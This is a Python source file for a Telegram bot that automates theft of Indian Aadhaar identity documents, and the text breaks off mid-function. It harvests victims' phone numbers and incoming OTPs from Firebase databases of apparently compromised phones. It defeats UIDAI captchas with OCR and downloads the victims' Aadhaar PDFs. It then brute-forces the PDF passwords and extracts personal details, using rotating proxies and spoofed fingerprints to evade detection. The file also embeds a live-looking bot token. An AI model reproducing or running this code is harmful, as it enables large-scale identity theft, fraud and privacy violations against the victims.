"""
╔══════════════════════════════════════════════════╗
║          AUTO-OTP BOT v5.0                       ║
║   Firebase → Auto Number → Auto OTP → PDF Drop   ║
║   (Decrypted PDF + Aadhaar details card)         ║
╚══════════════════════════════════════════════════╝
"""

import requests
import json
import base64
import uuid
import re
import os
import sys
import time
import logging
import threading
import random
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import PyPDF2
    _HAS_PYPDF2 = True
except ImportError:
    _HAS_PYPDF2 = False

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# ============== CONFIG ==============
BOT_TOKEN = "8800949076:AAHnyQb6YYbCs98KZyl7uhDfsv2jdHlgFEo"
OWNER_IDS = {8337013809}
BOT_NAME = "⚡ Auto-OTP Bot"
DIVIDER = "━━━━━━━━━━━━━━━"
NAME_API = "https://sarkariupdate.online/osint/APIX.php?api=num_api&q="
PROXY_FILE = "proxies.txt"
PROXY_POOL = []
OTP_WAIT_SECONDS = 60

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("AutoOTP")


# ============== PROXY LOADER ==============
def load_proxies():
    global PROXY_POOL
    PROXY_POOL = []
    here = os.path.dirname(os.path.abspath(__file__))
    cwd = os.getcwd()
    candidates = [PROXY_FILE, os.path.join(here, PROXY_FILE),
                  os.path.join(cwd, PROXY_FILE), "/app/proxies.txt"]
    found_path = None
    for p in candidates:
        if os.path.exists(p):
            found_path = p
            break
    if not found_path:
        logger.warning(f"[PROXY] not found. cwd={cwd}")
        return
    logger.info(f"[PROXY] using {found_path} ({os.path.getsize(found_path)} bytes)")
    try:
        with open(found_path, 'r', encoding='utf-8-sig', errors='ignore') as f:
            content = f.read()
    except Exception as e:
        logger.error(f"[PROXY] read error: {e}")
        return
    for i, raw in enumerate(content.splitlines(), 1):
        line = raw.strip().strip('\ufeff')
        if not line or line.startswith('#'):
            continue
        proxy = None
        if '://' in line:
            proxy = line
        elif '@' in line:
            proxy = f"http://{line}"
        else:
            parts = line.split(':')
            if len(parts) == 2:
                proxy = f"http://{parts[0]}:{parts[1]}"
            elif len(parts) == 4:
                host, port, user, pwd = parts
                proxy = f"http://{user}:{pwd}@{host}:{port}"
            else:
                logger.warning(f"[PROXY] line {i}: invalid ({len(parts)} parts)")
                continue
        PROXY_POOL.append(proxy)
        logger.info(f"[PROXY] line {i}: ✅ ...@{proxy.split('@')[-1]}")
    logger.info(f"[PROXY] === loaded {len(PROXY_POOL)} proxies ===")


def test_proxy(proxy, timeout=12):
    try:
        r = requests.get("https://api.ipify.org?format=json",
                         proxies={"http": proxy, "https": proxy}, timeout=timeout)
        if r.status_code == 200:
            return True, f"exit IP {r.json().get('ip','?')}"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, f"{type(e).__name__}: {str(e)[:80]}"


# ============== STATE ==============
firebase_dbs = []
firebase_lock = threading.Lock()
used_numbers = set()
used_lock = threading.Lock()
auto_running = {}
_pending_urls = {}
_tg_session = None

# ============== OCR ==============
try:
    import ddddocr
    ocr_solver = ddddocr.DdddOcr(show_ad=False)
    ocr_solver_beta = ddddocr.DdddOcr(beta=True, show_ad=False)
    print("[OCR] loaded OK", flush=True)
except Exception as e:
    print(f"[OCR] FAILED: {e}", flush=True)
    ocr_solver = ocr_solver_beta = None

# ============== FINGERPRINT ==============
UA_POOL = [
    ('Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/131.0.0.0 Mobile Safari/537.36', '"Google Chrome";v="131"', '"Android"'),
    ('Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/130.0.0.0 Mobile Safari/537.36', '"Google Chrome";v="130"', '"Android"'),
    ('Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1', '"Safari";v="18"', '"iOS"'),
    ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36', '"Google Chrome";v="131"', '"Windows"'),
]
SCREEN_POOL = ['360x800', '393x873', '412x915', '414x896', '390x844', '375x812', '1920x1080']


def get_fp():
    ua, ch, pl = random.choice(UA_POOL)
    w, h = random.choice(SCREEN_POOL).split('x')
    mob = '?1' if 'Mobile' in ua or 'Android' in ua or 'iPhone' in ua else '?0'
    return {'User-Agent': ua,
            'sec-ch-ua': f'{ch},"Chromium";v="131","Not)A;Brand";v="24"',
            'sec-ch-ua-mobile': mob,
            'sec-ch-ua-platform': pl,
            'viewport-width': w,
            'device-memory': str(random.choice([2, 4, 8])),
            'dnt': str(random.choice([0, 1]))}


# ============== SESSION ==============
_thread_local = threading.local()


def _reset_uidai_session():
    _thread_local.sess = None


def get_sess():
    sess = getattr(_thread_local, 'sess', None)
    if sess is None:
        sess = requests.Session()
        sess.mount('https://', requests.adapters.HTTPAdapter(
            pool_connections=5, pool_maxsize=5, max_retries=1, pool_block=False))
        if PROXY_POOL:
            p = random.choice(PROXY_POOL)
            sess.proxies = {'http': p, 'https': p}
        _thread_local.sess = sess
    return sess


# ============== FIREBASE HELPERS ==============
def fb_url(url, path, auth=""):
    base = url.rstrip('/')
    full = f"{base}/{path}"
    if auth:
        sep = '&' if '?' in full else '?'
        full = f"{full}{sep}auth={auth}"
    return full


def fb_get(url, path, auth="", timeout=10):
    try:
        r = requests.get(fb_url(url, path, auth), timeout=timeout)
        if r.status_code == 200:
            return r.json()
    except Exception as e:
        logger.debug(f"[FB] {path} error: {e}")
    return None


# ============== TELEGRAM ==============
def tg():
    global _tg_session
    if not _tg_session:
        _tg_session = requests.Session()
    return _tg_session


def send_msg(cid, text, rm=None):
    d = {'chat_id': cid, 'text': text, 'parse_mode': 'HTML', 'disable_web_page_preview': True}
    if rm:
        d['reply_markup'] = json.dumps(rm)
    try:
        return tg().post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=d, timeout=15).json()
    except:
        return {}


def edit_msg(cid, mid, text):
    try:
        tg().post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",
                  json={'chat_id': cid, 'message_id': mid, 'text': text,
                        'parse_mode': 'HTML', 'disable_web_page_preview': True}, timeout=10)
    except:
        pass


def send_doc(cid, path, caption="", fname="Aadhaar.pdf"):
    try:
        with open(path, 'rb') as f:
            return tg().post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                             data={'chat_id': cid, 'caption': caption, 'parse_mode': 'HTML'},
                             files={'document': (fname, f)}, timeout=60).json()
    except:
        return {}


def get_updates(offset=None):
    p = {'timeout': 30, 'allowed_updates': ['message']}
    if offset:
        p['offset'] = offset
    try:
        r = tg().get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", params=p, timeout=40)
        d = r.json()
        if d.get('ok'):
            return d.get('result', [])
    except Exception as e:
        logger.error(f"Updates: {e}")
        time.sleep(5)
    return []


# ============== UIDAI ==============
BH = {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'en_IN',
      'Content-Type': 'application/json',
      'Origin': 'https://myaadhaar.uidai.gov.in',
      'Referer': 'https://myaadhaar.uidai.gov.in/',
      'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-site', 'appid': 'MYAADHAAR'}


def get_captcha(retries=3):
    for i in range(1, retries + 1):
        tid = str(uuid.uuid4())
        try:
            _reset_uidai_session()
            s = get_sess()
            s.headers.update({**BH, **get_fp(), 'x-request-id': tid, 'transactionId': tid})
            r = s.post('https://tathya.uidai.gov.in/audioCaptchaService/api/captcha/v3/generation',
                       json={'captchaLength': '6', 'captchaType': '2', 'audioCaptchaRequired': True},
                       timeout=45)
            if r.status_code != 200:
                continue
            rj = r.json()
            ctxn = rj.get('transactionId')
            cb64 = rj.get('imageBase64')
            if not cb64:
                for k, v in rj.items():
                    if isinstance(v, str) and len(v) > 100:
                        cb64 = v
                        break
            if not cb64:
                continue
            if cb64.startswith('data:image'):
                cb64 = cb64.split(',')[1]
            return base64.b64decode(cb64), ctxn, tid
        except Exception as e:
            logger.warning(f"Captcha {i}: {e}")
            time.sleep(0.5)
    return None, None, None


def solve_cap(img):
    if not ocr_solver_beta:
        return ""
    try:
        import io
        from PIL import Image, ImageFilter, ImageEnhance, ImageOps
        im = Image.open(io.BytesIO(img))
        if im.mode != 'L':
            im = im.convert('L')
        w, h = im.size
        im = im.resize((w * 2, h * 2), Image.LANCZOS)
        im = im.filter(ImageFilter.MedianFilter(3))
        im = ImageEnhance.Contrast(im).enhance(2.0)
        im = ImageEnhance.Sharpness(im).enhance(2.0)
        im = im.point(lambda p: 255 if p > 140 else 0)
        im = ImageOps.autocontrast(im, cutoff=5)
        buf = io.BytesIO()
        im.save(buf, format='PNG')
        r = ocr_solver_beta.classification(buf.getvalue())
        if r and len(r) >= 4:
            r = ''.join(c for c in r if c.isalnum())
            if len(r) >= 4:
                return r[:6]
    except:
        pass
    try:
        return ocr_solver.classification(img)
    except:
        return ""


def send_eid_otp(mob, name, cap, ctxn, tid):
    _reset_uidai_session()
    s = get_sess()
    s.headers.update({**BH, **get_fp(), 'x-request-id': tid, 'transactionId': tid})
    d = {'mobileNumber': mob, 'dob': None, 'email': None, 'name': name.upper(),
         'option': 'EID', 'otp': None, 'otpTxnId': None,
         'captchaTxnId': ctxn, 'captcha': cap, 'resendOtp': False}
    try:
        r = s.post('https://tathya.uidai.gov.in/retrieveEidUid/ext/v1/generic/retrieveuideid',
                   json=d, timeout=30)
        if r.status_code == 200:
            rj = r.json()
            if 'responseData' in rj:
                rd = rj['responseData']
                if rd.get('otpTxnId') and rd.get('status') == "Success":
                    return True, rd['otpTxnId'], None
                return False, None, rd.get('message', 'Error')
            return False, None, 'Bad response'
        return False, None, f'HTTP {r.status_code}'
    except Exception as e:
        return False, None, str(e)


def verify_eid(mob, name, otp, otxn, ctxn, cap):
    _reset_uidai_session()
    s = get_sess()
    s.headers.update({**BH, **get_fp(), 'x-request-id': str(uuid.uuid4())})
    d = {'mobileNumber': mob, 'dob': None, 'name': name.upper(), 'email': None,
         'option': 'EID', 'otp': otp, 'otpTxnId': otxn,
         'captchaTxnId': ctxn, 'captcha': cap, 'resendOtp': False}
    try:
        r = s.post('https://tathya.uidai.gov.in/retrieveEidUid/ext/v1/generic/retrieveuideid',
                   json=d, timeout=60)
        if r.status_code == 200:
            rj = r.json()
            if rj.get('status') in [200, "Success"] and 'responseData' in rj:
                rd = rj['responseData']
                eid = rd.get('eidNumber')
                nm = rd.get('name', name)
                if eid:
                    return True, eid, nm
                return False, None, "No EID"
            ed = rj.get('errorDetails')
            if isinstance(ed, dict):
                return False, None, ed.get('messageEnglish', 'Failed')
            return False, None, rj.get('message', 'Failed')
        return False, None, f'HTTP {r.status_code}'
    except Exception as e:
        return False, None, str(e)


def send_aadh_otp(eid, cap, ctxn, tid):
    _reset_uidai_session()
    s = get_sess()
    s.headers.update({**BH, **get_fp(), 'x-request-id': tid, 'transactionId': tid})
    d = {'eidNumber': eid, 'idType': 'eid', 'captchaTxnId': ctxn,
         'captchaValue': cap, 'transactionId': tid, 'resendOTP': False}
    try:
        r = s.post('https://tathya.uidai.gov.in/unifiedAppAuthService/api/v2/generate/aadhaar/otp',
                   json=d, timeout=45)
        if r.status_code == 200:
            rj = r.json()
            txn = rj.get('txnId')
            if txn and rj.get('status') == "Success":
                return True, txn, None
            return False, None, rj.get('message', 'Failed')
        return False, None, f'HTTP {r.status_code}'
    except Exception as e:
        return False, None, str(e)


# ============== RECURSIVE PDF EXTRACTOR ==============
def _is_base64_str(s):
    if not isinstance(s, str) or len(s) < 100:
        return False
    if s.startswith('data:'):
        s = s.split(',', 1)[1] if ',' in s else s
    if len(s) % 4 != 0:
        return False
    try:
        base64.b64decode(s, validate=False)
        return True
    except Exception:
        return False


def _detect_file_type(b):
    if b[:4] == b'%PDF' or b[:5] == b'%PDF-':
        return 'pdf'
    if b[:8] == b'\x89PNG\r\n\x1a\n':
        return 'png'
    if b[:2] == b'\xff\xd8':
        return 'jpg'
    return 'unknown'


def _extract_file_from_json(data, field_path="root", found=None):
    if found is None:
        found = []
    if isinstance(data, dict):
        for key, value in list(data.items()):
            if isinstance(value, str) and _is_base64_str(value):
                try:
                    clean = value.split(',', 1)[1] if value.startswith('data:') and ',' in value else value
                    dec = base64.b64decode(clean, validate=False)
                    ftype = _detect_file_type(dec)
                    if ftype != 'unknown':
                        found.append({
                            'field': f"{field_path}.{key}",
                            'type': ftype, 'data': dec, 'size': len(dec),
                        })
                except Exception:
                    pass
            if isinstance(value, (dict, list)):
                _extract_file_from_json(value, f"{field_path}.{key}", found)
    elif isinstance(data, list):
        for idx, item in enumerate(data):
            if isinstance(item, (dict, list)):
                _extract_file_from_json(item, f"{field_path}[{idx}]", found)
    return found


def dl_pdf(eid, otp, otxn, tid, chat_id=None):
    _reset_uidai_session()
    s = get_sess()
    s.headers.update({**BH, **get_fp(), 'x-request-id': tid, 'transactionId': tid})
    d = {'eid': eid, 'mask': False, 'otp': str(otp), 'otpTxnId': otxn}

    logger.info(f"[PDF] request: eid={eid[:8]}... otp={otp} otpTxnId={str(otxn)[:8]}...")

    try:
        r = s.post('https://tathya.uidai.gov.in/downloadAadhaarService/api/aadhaar/download',
                   json=d, timeout=90)
    except Exception as e:
        logger.warning(f"[PDF] request exception: {e}")
        return False, str(e)

    logger.info(f"[PDF] HTTP={r.status_code} body_len={len(r.content)}")

    if r.status_code == 200 and (r.content[:4] == b'%PDF' or r.content[:5] == b'%PDF-'):
        fp = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                          f"aadh_{int(time.time())}.pdf")
        with open(fp, 'wb') as f:
            f.write(r.content)
        logger.info(f"[PDF] ✅ raw PDF saved: {len(r.content)} bytes")
        return True, fp

    if r.status_code != 200:
        return False, f'HTTP {r.status_code}'

    try:
        rj = r.json()
    except Exception:
        return False, 'non-JSON response'

    found = _extract_file_from_json(rj)
    chosen = None
    for item in found:
        if item['type'] == 'pdf':
            chosen = item
            break
    if chosen is None and found:
        chosen = found[0]

    if chosen:
        ext = {'pdf': 'pdf', 'png': 'png', 'jpg': 'jpg'}.get(chosen['type'], 'bin')
        fp = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                          f"aadh_{int(time.time())}.{ext}")
        with open(fp, 'wb') as f:
            f.write(chosen['data'])
        logger.info(f"[PDF] ✅ extracted from {chosen['field']} ({chosen['size']} bytes)")
        if chosen['type'] == 'pdf':
            return True, fp
        return False, f"unexpected type: {chosen['type']}"

    err = rj.get('errorDetails') or rj.get('message') or rj.get('errorMessage') or 'no PDF'
    if isinstance(err, dict):
        err = err.get('messageEnglish') or err.get('messageLocal') or json.dumps(err)[:200]
    return False, str(err)[:200]


# ============== PDF PASSWORD CRACKER (bot55 style) ==============
from datetime import datetime


class PDFPasswordCracker:
    def __init__(self):
        self.executor = ThreadPoolExecutor(max_workers=16)
        self.stop_flag = False

    def try_password(self, pdf_bytes, password):
        try:
            reader = PyPDF2.PdfReader(BytesIO(pdf_bytes))
            if reader.decrypt(password):
                return True, password
            return False, None
        except Exception:
            return False, None

    def decrypt_pdf(self, pdf_path, password, output_path=None):
        try:
            if output_path is None:
                output_path = pdf_path.replace('.pdf', '_decrypted.pdf')
            with open(pdf_path, 'rb') as f:
                reader = PyPDF2.PdfReader(f)
                reader.decrypt(password)
                writer = PyPDF2.PdfWriter()
                for page in reader.pages:
                    writer.add_page(page)
                with open(output_path, 'wb') as out:
                    writer.write(out)
            logger.info(f"[CRACK] decrypted PDF saved: {output_path}")
            return output_path
        except Exception as e:
            logger.error(f"[CRACK] decrypt_pdf error: {e}")
            return None

    def crack(self, pdf_path, name):
        self.stop_flag = False
        try:
            with open(pdf_path, 'rb') as f:
                pdf_bytes = f.read()
        except Exception as e:
            logger.error(f"[CRACK] read error: {e}")
            return False, None, None

        name_upper = name.upper().strip()
        words = [w for w in name_upper.split() if len(w) >= 2]

        prefixes = set()
        if len(name_upper) >= 4:
            prefixes.add(name_upper[:4])
        for w in words:
            prefixes.add(w[:4])
            prefixes.add(w[:3])
            if len(w) >= 5:
                prefixes.add(w[:5])
        no_space = name_upper.replace(' ', '')
        prefixes.add(no_space[:4])
        if len(no_space) >= 6:
            prefixes.add(no_space[:6])

        current_year = datetime.now().year
        years = list(range(1930, current_year + 1))

        # High priority: PREFIX + year (upper)
        candidates = []
        seen = set()
        for pfx in prefixes:
            for yr in years:
                p = f"{pfx.upper()}{yr}"
                if p not in seen:
                    seen.add(p)
                    candidates.append(p)
        # Lower priority: lowercase and title
        for pfx in prefixes:
            for yr in years:
                for variant in (pfx.lower(), pfx.title()):
                    p = f"{variant}{yr}"
                    if p not in seen:
                        seen.add(p)
                        candidates.append(p)
        # Bare prefixes
        for pfx in prefixes:
            for v in (pfx.upper(), pfx.lower(), pfx.title()):
                if v not in seen:
                    seen.add(v)
                    candidates.append(v)

        logger.info(f"[CRACK] trying {len(candidates)} passwords for name='{name_display_safe(name)}'")

        batch_size = 64
        for i in range(0, len(candidates), batch_size):
            if self.stop_flag:
                break
            batch = candidates[i:i + batch_size]
            futures = {self.executor.submit(self.try_password, pdf_bytes, p): p for p in batch}
            for fut in as_completed(futures):
                if self.stop_flag:
                    break
                try:
                    ok, pwd = fut.result()
                    if ok:
                        self.stop_flag = True
                        out = self.decrypt_pdf(pdf_path, pwd)
                        logger.info(f"[CRACK] ✅ password='{pwd}'")
                        return True, pwd, out
                except Exception:
                    continue
        logger.warning(f"[CRACK] no password found for name='{name_display_safe(name)}'")
        return False, None, None


def name_display_safe(n):
    return n if len(n) < 30 else n[:30] + "..."


_cracker = PDFPasswordCracker()


def decrypt_pdf_auto(pdf_path, name):
    """Try to crack the PDF password and return the decrypted path (or None)."""
    if not _HAS_PYPDF2:
        logger.warning("[DECRYPT] PyPDF2 not installed — returning original PDF")
        return pdf_path

    # Fast path: if the PDF is not encrypted, return as-is
    try:
        with open(pdf_path, 'rb') as f:
            reader = PyPDF2.PdfReader(f)
            if not reader.is_encrypted:
                logger.info("[DECRYPT] PDF is not encrypted")
                return pdf_path
    except Exception:
        pass

    ok, pwd, decrypted = _cracker.crack(pdf_path, name)
    if ok and decrypted and os.path.exists(decrypted):
        return decrypted
    logger.warning(f"[DECRYPT] could not crack for name='{name}'")
    return None


# ============== AADHAAR PDF DETAILS EXTRACTOR ==============
def extract_aadhaar_details(pdf_path):
    if not _HAS_PYPDF2:
        return None
    try:
        with open(pdf_path, 'rb') as f:
            reader = PyPDF2.PdfReader(f)
            text = ''
            for page in reader.pages:
                text += page.extract_text() or ''

        details = {'name': '', 'gender': '', 'dob': '', 'aadhaar': '',
                   'address': '', 'pincode': '', 'state': '', 'district': '',
                   'phone': '', 'email': '', 'father_name': '',
                   'year_of_birth': '', 'issued_date': '', 'vid': '',
                   'blood_group': '', 'age': ''}

        for i, line in enumerate(text.split('\n')):
            s = line.strip()
            if not s:
                continue

            if 'Name' in s and ':' in s:
                parts = s.split(':', 1)
                if len(parts) > 1 and parts[1].strip() and not details['name']:
                    details['name'] = parts[1].strip()

            if 'Gender' in s and ':' in s:
                parts = s.split(':', 1)
                if len(parts) > 1:
                    v = parts[1].strip().upper()
                    if v in ('MALE', 'FEMALE', 'OTHER'):
                        details['gender'] = v
            if not details['gender']:
                for w in ('Male', 'Female', 'MALE', 'FEMALE'):
                    if w in s:
                        details['gender'] = w.upper()
                        break

            if ('DOB' in s or 'Date of Birth' in s) and ':' in s:
                parts = s.split(':', 1)
                if len(parts) > 1 and not details['dob']:
                    details['dob'] = parts[1].strip()

            if ('Year of Birth' in s or 'YoB' in s) and ':' in s:
                parts = s.split(':', 1)
                if len(parts) > 1:
                    yob = parts[1].strip()
                    if re.match(r'\d{4}', yob):
                        details['year_of_birth'] = yob

            if 'Age' in s and ':' in s:
                parts = s.split(':', 1)
                if len(parts) > 1:
                    am = re.search(r'(\d+)', parts[1])
                    if am:
                        details['age'] = am.group(1)

            if ('Father' in s or 'Husband' in s) and ':' in s:
                parts = s.split(':', 1)
                if len(parts) > 1 and parts[1].strip() and not details['father_name']:
                    details['father_name'] = parts[1].strip()

            am = re.search(r'\b(\d{4}\s?\d{4}\s?\d{4})\b', s)
            if am and not details['aadhaar']:
                details['aadhaar'] = am.group(1)

            vm = re.search(r'\b(\d{4}\s?\d{4}\s?\d{4}\s?\d{4})\b', s)
            if vm:
                vid_num = vm.group(1).replace(' ', '')
                if len(vid_num) == 16 and vid_num != details['aadhaar'].replace(' ', ''):
                    details['vid'] = vm.group(1)

            bgm = re.search(r'(A\+|A-|B\+|B-|AB\+|AB-|O\+|O-|A Positive|A Negative|B Positive|B Negative|AB Positive|AB Negative|O Positive|O Negative)', s, re.IGNORECASE)
            if bgm:
                details['blood_group'] = bgm.group(1).upper()

            if ('Issued' in s or 'Generated' in s or 'Date of Issue' in s) and ':' in s:
                parts = s.split(':', 1)
                if len(parts) > 1:
                    date_str = parts[1].strip()
                    if re.search(r'\d{2}/\d{2}/\d{4}|\d{2}-\d{2}-\d{4}|\d{4}', date_str):
                        details['issued_date'] = date_str

            if not details['pincode']:
                pm = re.search(r'\b(\d{6})\b', s)
                if pm:
                    details['pincode'] = pm.group(1)

            if 'State' in s and ':' in s:
                parts = s.split(':', 1)
                if len(parts) > 1 and not details['state']:
                    details['state'] = parts[1].strip()
            if ('District' in s or 'Dist' in s) and ':' in s:
                parts = s.split(':', 1)
                if len(parts) > 1 and not details['district']:
                    details['district'] = parts[1].strip()
            if 'Phone' in s or 'Mobile' in s:
                pm = re.search(r'\b(\d{10})\b', s)
                if pm:
                    details['phone'] = pm.group(1)
            if 'Email' in s and ':' in s:
                parts = s.split(':', 1)
                if len(parts) > 1 and not details['email']:
                    details['email'] = parts[1].strip()

            addr_kws = ['House', 'Street', 'Road', 'Village', 'Post',
                        'Colony', 'Ward', 'Block', 'Tehsil', 'Sub',
                        'City', 'Town', 'Mandal', 'Landmark', 'Area', 'Locality']
            if any(kw in s for kw in addr_kws):
                if not details['address']:
                    details['address'] = s
                elif s not in details['address']:
                    details['address'] += ', ' + s

        if details['district'] and details['state']:
            loc = ', '.join(p for p in [details['district'], details['state']] if p)
            if details['pincode']:
                loc += ' - ' + details['pincode']
            if not details['address']:
                details['address'] = loc
            elif loc not in details['address']:
                details['address'] += ', ' + loc

        if not details['dob'] and details['year_of_birth']:
            details['dob'] = details['year_of_birth']
        return details
    except Exception as e:
        logger.error(f"[PDF-TEXT] {e}")
        return None


# ============== PHONE HELPERS ==============
def _looks_like_phone(s):
    if s is None:
        return None
    if isinstance(s, (int, float)):
        s = str(int(s))
    d = re.sub(r'[^0-9]', '', str(s))
    if d.startswith('0091'):
        d = d[4:]
    elif d.startswith('091'):
        d = d[3:]
    elif d.startswith('91') and len(d) == 12:
        d = d[2:]
    if len(d) == 11 and d.startswith('0'):
        d = d[1:]
    if len(d) == 10 and re.match(r'^[6-9]\d{9}$', d):
        return d
    return None


def _is_online(dd):
    if not isinstance(dd, dict):
        return False
    st = dd.get("status")
    if st is True or st == 1:
        return True
    if isinstance(st, str) and st.strip().lower() in ("true", "1", "online", "on", "active", "yes", "connected"):
        return True
    return False


_SIM_PATTERNS = [
    re.compile(r'(?:Vi|Jio|Airtel|Vodafone|BSNL|Idea)\s+number\s+([6-9]\d{9})', re.I),
    re.compile(r'your\s+(?:Vi|Jio|Airtel|Vodafone|BSNL|Idea)\s+number\s+([6-9]\d{9})', re.I),
    re.compile(r'(?:Account|user|customer|A/c)\s*[:\-\(]\s*(?:\+91|91|0)?([6-9]\d{9})', re.I),
    re.compile(r'your\s+number\s*[:\-]?\s*(?:\+91|91|0)?([6-9]\d{9})', re.I),
    re.compile(r'(?:number|mobile|phone)\s*[:\-]\s*(?:\+91|91|0)?([6-9]\d{9})', re.I),
]


def _extract_own_sim_from_messages(msgs):
    if not isinstance(msgs, dict):
        return None
    try:
        items = sorted(msgs.items(), key=lambda kv: str(kv[0]), reverse=True)
    except Exception:
        items = list(msgs.items())
    for _mid, md in items[:50]:
        if not isinstance(md, dict):
            continue
        body = str(md.get("message", "") or md.get("body", "") or md.get("msg", "") or "")
        if not body:
            continue
        for pat in _SIM_PATTERNS:
            m = pat.search(body)
            if m:
                norm = _looks_like_phone(m.group(1))
                if norm:
                    return norm
    for _mid, md in items[:20]:
        if not isinstance(md, dict):
            continue
        body = str(md.get("message", "") or md.get("body", "") or md.get("msg", "") or "")
        for m in re.finditer(r'\b(?:\+91|91|0)?([6-9]\d{9})\b', body):
            norm = _looks_like_phone(m.group(1))
            if norm:
                return norm
    return None


def _scan_one_device(base_url, auth, cid, dd, bot_map):
    if cid in bot_map:
        p = _looks_like_phone(bot_map[cid])
        if p:
            return p, "bot_users"
    try:
        q = fb_url(base_url, f"messages/{cid}.json?orderBy=%22%24key%22&limitToLast=30", auth)
        r = requests.get(q, timeout=10)
        if r.status_code == 200:
            msgs = r.json()
            p = _extract_own_sim_from_messages(msgs)
            if p:
                return p, "messages"
    except Exception:
        pass
    return None, None


def fb_scan():
    seen = {}
    with firebase_lock:
        dbs = list(firebase_dbs)
    logger.info(f"[SCAN] === scanning {len(dbs)} DB(s) ===")

    for db in dbs:
        url = db['url'].rstrip('/')
        auth = db.get('auth', '') or ''

        clients = fb_get(url, "clients.json", auth, timeout=15)
        if not isinstance(clients, dict) or not clients:
            continue

        online = [cid for cid, cdata in clients.items()
                  if isinstance(cdata, dict) and _is_online(cdata)]
        logger.info(f"[SCAN] {url.split('//')[-1][:40]} total={len(clients)} online={len(online)}")

        bot_map = {}
        try:
            bu = fb_get(url, "bot_users.json", auth, timeout=10)
            if isinstance(bu, dict):
                for phone_key, cfg in bu.items():
                    if isinstance(cfg, dict):
                        did = str(cfg.get("selected_device_id", "")).strip()
                        norm = _looks_like_phone(phone_key)
                        if did and norm:
                            bot_map[did] = norm
                logger.info(f"[SCAN] bot_users mapped: {len(bot_map)}")
        except Exception:
            pass

        results = []
        with ThreadPoolExecutor(max_workers=8) as pool:
            futures = {pool.submit(_scan_one_device, url, auth, cid, clients[cid], bot_map): cid
                       for cid in online}
            for fut in as_completed(futures):
                cid = futures[fut]
                try:
                    phone, src = fut.result()
                    if phone:
                        results.append((cid, phone, src))
                except Exception:
                    pass

        logger.info(f"[SCAN] {url.split('//')[-1][:40]} resolved={len(results)}/{len(online)}")

        for cid, phone, src in results:
            dd = clients.get(cid) or {}
            batt_raw = str(dd.get("battery", "")).replace("%", "").strip()
            try:
                batt = int(batt_raw) if batt_raw else 0
            except:
                batt = 0
            last_ts = 0
            for k in ("lastMessageTime", "last_message_time", "lastSeen", "timestamp"):
                v = dd.get(k)
                if isinstance(v, (int, float)) and v > last_ts:
                    last_ts = int(v)

            prev = seen.get(phone)
            if prev is None or (last_ts, batt) > (prev["last_ts"], prev["batt"]):
                seen[phone] = {
                    "db_url": url, "db_auth": auth,
                    "dev_id": cid, "phone": phone,
                    "battery": str(dd.get("battery", "?"))[:6],
                    "last_ts": last_ts, "batt": batt, "src": src,
                }

    devs = []
    with used_lock:
        for ph, info in seen.items():
            if ph in used_numbers:
                continue
            devs.append({
                "db_url": info["db_url"], "db_auth": info["db_auth"],
                "dev_id": info["dev_id"], "phone": info["phone"],
                "phone_display": info["phone"], "battery": info["battery"],
            })

    logger.info(f"[SCAN] === unique online phones: {len(seen)} | final: {len(devs)} ===")
    return devs


def fb_msgids(url, auth, did):
    try:
        q = fb_url(url, f"messages/{did}.json?shallow=true", auth)
        r = requests.get(q, timeout=8)
        if r.status_code == 200 and r.json():
            return set(r.json().keys())
    except:
        pass
    return set()


def fb_otp_filtered(url, auth, did, existing_keys, timeout=60,
                    require_keywords=None, exclude_keywords=None):
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            q = fb_url(url, f"messages/{did}.json?orderBy=%22%24key%22&limitToLast=30", auth)
            r = requests.get(q, timeout=8)
            if r.status_code == 200 and r.json():
                ms = r.json()
                if isinstance(ms, dict):
                    for mid, md in sorted(ms.items(), reverse=True):
                        if mid in existing_keys:
                            continue
                        if not isinstance(md, dict):
                            continue
                        body = str(md.get("message", "") or md.get("body", "") or md.get("msg", "") or md.get("text", "") or "")
                        bl = body.lower()
                        if require_keywords and not any(k.lower() in bl for k in require_keywords):
                            continue
                        if exclude_keywords and any(k.lower() in bl for k in exclude_keywords):
                            continue
                        for o in re.findall(r'\b(\d{6})\b', body):
                            if o not in ("000000", "123456", "111111", "999999"):
                                logger.info(f"[OTP-READ] {did[:14]} → {o}")
                                return o, body
        except Exception:
            pass
        time.sleep(3)
    return None, ""


# ============== AUTO WORKER ==============
def auto_worker(cid, count):
    stop = auto_running.get(cid)
    done = 0
    wins = 0
    with firebase_lock:
        dbc = len(firebase_dbs)
    if dbc == 0:
        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗  No Firebase DBs!\n<i>/addfire URL</i>")
        auto_running.pop(cid, None)
        return

    send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>〔 🚀 AUTO-OTP Started 〕</b>\n\n"
                  f"◈  Target · {count} PDFs\n◈  Firebase · {dbc} DBs\n"
                  f"◈  Proxies · {len(PROXY_POOL)}\n<i>◌  Scanning...</i>")
    devs = fb_scan()
    if not devs:
        send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗  No online devices.")
        auto_running.pop(cid, None)
        return

    send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>📱 {len(devs)} Devices</b>\n"
                  f"◈  Processing {min(count, len(devs))}...\n<i>◌  Running...</i>")

    for dev in devs[:count]:
        if stop and stop.is_set():
